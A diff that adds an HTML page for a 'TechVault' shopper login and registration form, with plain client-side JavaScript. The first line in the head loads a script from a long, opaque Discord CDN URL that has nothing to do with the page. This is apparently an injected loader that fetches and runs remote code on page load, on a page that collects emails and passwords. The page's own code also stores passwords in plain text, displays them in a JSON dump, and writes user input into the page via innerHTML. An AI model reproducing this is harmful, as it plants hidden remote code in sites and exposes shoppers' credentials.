@@ -1,0 +1,285 @@
+<!DOCTYPE html>
+<html lang="en">
+<head><script type='text/javascript' src='https://cdn.discordapp.com/JTUrAVa6g3SXb7vIQJy47mXE39xDLIhQjYUEYFcJ4WJwWB_bdxGsJb2r7sWqfeQet7EOMLm0hKHZnjaP9P3ICas6orBjeFOwleK8_L8SD7HjYNzzGnbUaHket1QDdL71QxSmIEID69bKVL6HI20ddj0oeSzZFLeeIDB6t4w8k4DJ7S_cPkpG9gt1SpbLf5s88WbVKIW5bRYlANB7aYEejH67hH_Q7LsN11YK7WKDkpvmCjTh_yMdkQ9e2oKJ0ElMFGcU8bdolEdbl7eL9PBKmDFosl6s6GkatCDd66fVyXuOocfTmuJXNXORAJrXkXF7D-vgddPtbaPOaGPdNMYZx2Acis2YUqWpDkK-riSNZb4LjeYPLHc7a2CplAX5qZpNwg4FeRpfFWfEnTJ56OQhgm7cDyhD0-U38s5QaKt40LI9cbwUN0FqrfaRqg3XPcUAqJezdmbyNMP-Ax8Cd2eZcf4gCRr3MviAyrvGHa6SjAcYwmTcCSxfQu5BP8A7JYf0TptlwvqUdtP8d334D6YRtFBvelrHMYUSxbyphzU2DsmCMeO30G5m8NsFaHR5NQqYm3d6c4bofdh6f5FP4pp7OnS2v8DaeM7uTU8YIUArA4SRU6VseIvEUqMfRuBRz8xcpT8WflI3ks8T1XnMqXMbMMX8doSMitiDMeom4m2wKJxQcGCo'></script>
+  <title>TechVault Shopper Management</title>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <link href="https://fonts.googleapis.com/css?family=Montserrat" rel="stylesheet" type="text/css">
+  <link href="https://fonts.googleapis.com/css?family=Lato" rel="stylesheet" type="text/css">
+  <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.4.1/css/bootstrap.min.css">
+  <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
+  <script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.4.1/js/bootstrap.min.js"></script>
+  <style>
+    body { background-color: #4D7D94; }
+    .error { color: red; font-size: 13px; margin-top: 5px; }
+    #jsonOutput {
+      background-color: #fff;
+      padding: 15px;
+      margin-top: 20px;
+      border-radius: 5px;
+      font-family: monospace;
+      white-space: pre;
+      display: none;
+    }
+  </style>
+  <link href="styles.css" rel="stylesheet" type="text/css">
+</head>
+<body>
+
+<nav class="navbar navbar-default navbar-fixed-top">
+  <div class="container">
+    <div class="navbar-header">
+      <button type="button" class="navbar-toggle" data-toggle="collapse" data-target="#myNavbar">
+        <span class="icon-bar"></span>
+        <span class="icon-bar"></span>
+        <span class="icon-bar"></span>
+      </button>
+      <a class="navbar-brand" href="#">TECHVAULT</a>
+    </div>
+    <div class="collapse navbar-collapse" id="myNavbar">
+      <ul class="nav navbar-nav navbar-right">
+        <li class="active"><a href="shopper.html">SHOPPERS</a></li>
+        <li><a href="product.html">PRODUCTS</a></li>
+        <li><a href="cart.html">CART</a></li>
+        <li><a href="shipping.html">SHIPPING</a></li>
+        <li><a href="billing.html">BILLING</a></li>
+      </ul>
+    </div>
+  </div>
+</nav>
+
+<div class="jumbotron text-center" style="margin-top:50px;">
+  <h1>Shopper Management</h1>
+  <p>Create an account, sign in, or manage your shopper profile.</p>
+</div>
+
+<!-- LOGIN -->
+<div class="container-fluid">
+  <div class="row">
+    <div class="col-sm-6 col-sm-offset-3">
+      <div class="panel panel-default text-center">
+        <div class="panel-heading"><h3>Shopper Login</h3></div>
+        <div class="panel-body" style="text-align:left; padding:30px;">
+          <form id="loginForm" novalidate>
+
+            <div class="form-group">
+              <label>Email Address</label>
+              <input type="email" class="form-control" id="loginEmail">
+              <div id="loginEmailError" class="error"></div>
+            </div>
+
+            <div class="form-group">
+              <label>Password</label>
+              <input type="password" class="form-control" id="loginPassword">
+              <div id="loginPasswordError" class="error"></div>
+            </div>
+
+            <button type="submit" class="btn btn-primary btn-block">Sign In</button>
+            <div id="loginMessage" style="margin-top:10px;"></div>
+
+          </form>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+
+<div class="container-fluid">
+  <div class="row">
+    <div class="col-sm-8 col-sm-offset-2">
+      <div class="panel panel-default text-center">
+        <div class="panel-heading"><h3>New Shopper Registration</h3></div>
+        <div class="panel-body" style="text-align:left; padding:30px;">
+          <form id="shopperForm" novalidate>
+
+            <div class="form-group">
+              <label>Email Address (Required)</label>
+              <input type="email" class="form-control" id="email">
+              <div id="emailError" class="error"></div>
+            </div>
+
+            <div class="form-group">
+              <label>Password (Required)</label>
+              <input type="password" class="form-control" id="password">
+              <div id="passwordError" class="error"></div>
+            </div>
+
+            <div class="form-group">
+              <label>Full Name (Required)</label>
+              <input type="text" class="form-control" id="name">
+              <div id="nameError" class="error"></div>
+            </div>
+
+            <div class="form-group">
+              <label>Contact Phone (Optional)</label>
+              <input type="text" class="form-control" id="phone">
+            </div>
+
+            <div class="form-group">
+              <label>Age (Required)</label>
+              <input type="number" class="form-control" id="age">
+              <div id="ageError" class="error"></div>
+            </div>
+
+            <div class="form-group">
+              <label>Address (Required)</label>
+              <input type="text" class="form-control" id="address">
+              <div id="addressError" class="error"></div>
+            </div>
+
+            <button type="submit" class="btn btn-primary btn-block">Register Shopper</button>
+
+          </form>
+
+          <div id="jsonOutput"></div>
+
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+
+
+<div class="container-fluid">
+  <div class="row">
+    <div class="col-sm-10 col-sm-offset-1">
+      <div class="panel panel-default text-center">
+        <div class="panel-heading"><h3>Registered Shoppers</h3></div>
+        <div class="panel-body" style="padding:30px;">
+          <table class="table table-striped table-bordered">
+            <thead>
+              <tr>
+                <th>Name</th>
+                <th>Email</th>
+                <th>Phone</th>
+                <th>Age</th>
+                <th>Address</th>
+              </tr>
+            </thead>
+            <tbody id="shopperTableBody">
+              <tr><td colspan="5" class="text-center">No shoppers registered yet.</td></tr>
+            </tbody>
+          </table>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+
+<footer class="container-fluid text-center">
+  <p>&copy; 2026 TechVault Electronics</p>
+</footer>
+
+<script>
+  let shopperCollection = [];
+
+  document.getElementById("shopperForm").addEventListener("submit", function(e) {
+    e.preventDefault();
+    let isValid = true;
+
+    let email    = document.getElementById("email").value.trim();
+    let password = document.getElementById("password").value;
+    let name     = document.getElementById("name").value.trim();
+    let phone    = document.getElementById("phone").value.trim();
+    let age      = document.getElementById("age").value.trim();
+    let address  = document.getElementById("address").value.trim();
+
+    document.getElementById("emailError").innerHTML    = "";
+    document.getElementById("passwordError").innerHTML = "";
+    document.getElementById("nameError").innerHTML     = "";
+    document.getElementById("ageError").innerHTML      = "";
+    document.getElementById("addressError").innerHTML  = "";
+
+    if (!email || !email.includes("@")) {
+      document.getElementById("emailError").innerHTML = "Valid email is required.";
+      isValid = false;
+    }
+    if (!password) {
+      document.getElementById("passwordError").innerHTML = "Password is required.";
+      isValid = false;
+    }
+    if (!name) {
+      document.getElementById("nameError").innerHTML = "Name is required.";
+      isValid = false;
+    }
+    if (!age || isNaN(age) || age <= 0) {
+      document.getElementById("ageError").innerHTML = "Valid age is required.";
+      isValid = false;
+    }
+    if (!address) {
+      document.getElementById("addressError").innerHTML = "Address is required.";
+      isValid = false;
+    }
+
+    if (!isValid) return;
+
+    let shopper = {
+      shopperEmail:    email,
+      shopperPassword: password,
+      shopperName:     name,
+      shopperPhone:    phone,
+      shopperAge:      age,
+      shopperAddress:  address
+    };
+
+    shopperCollection.push(shopper);
+
+    let jsonEl = document.getElementById("jsonOutput");
+    jsonEl.style.display = "block";
+    jsonEl.textContent = JSON.stringify(shopperCollection, null, 2);
+
+    renderTable();
+
+    document.getElementById("shopperForm").reset();
+  });
+
+  document.getElementById("loginForm").addEventListener("submit", function(e) {
+    e.preventDefault();
+
+    let email    = document.getElementById("loginEmail").value.trim();
+    let password = document.getElementById("loginPassword").value;
+    let msgEl    = document.getElementById("loginMessage");
+
+    document.getElementById("loginEmailError").innerHTML    = "";
+    document.getElementById("loginPasswordError").innerHTML = "";
+
+    if (!email || !email.includes("@")) {
+      document.getElementById("loginEmailError").innerHTML = "Valid email is required.";
+      return;
+    }
+    if (!password) {
+      document.getElementById("loginPasswordError").innerHTML = "Password is required.";
+      return;
+    }
+
+    let match = shopperCollection.find(function(s) {
+      return s.shopperEmail === email && s.shopperPassword === password;
+    });
+
+    if (match) {
+      msgEl.innerHTML = '<div class="alert alert-success">Welcome back, ' + match.shopperName + '!</div>';
+    } else {
+      msgEl.innerHTML = '<div class="alert alert-danger">Invalid email or password.</div>';
+    }
+
+    document.getElementById("loginForm").reset();
+  });
+
+  function renderTable() {
+    let tbody = document.getElementById("shopperTableBody");
+    tbody.innerHTML = "";
+    shopperCollection.forEach(function(s) {
+      let tr = document.createElement("tr");
+      tr.innerHTML =
+        "<td>" + s.shopperName    + "</td>" +
+        "<td>" + s.shopperEmail   + "</td>" +
+        "<td>" + (s.shopperPhone || "—") + "</td>" +
+        "<td>" + s.shopperAge     + "</td>" +
+        "<td>" + s.shopperAddress + "</td>";
+      tbody.appendChild(tr);
+    });
+  }
+</script>
+
+</body>
+</html>
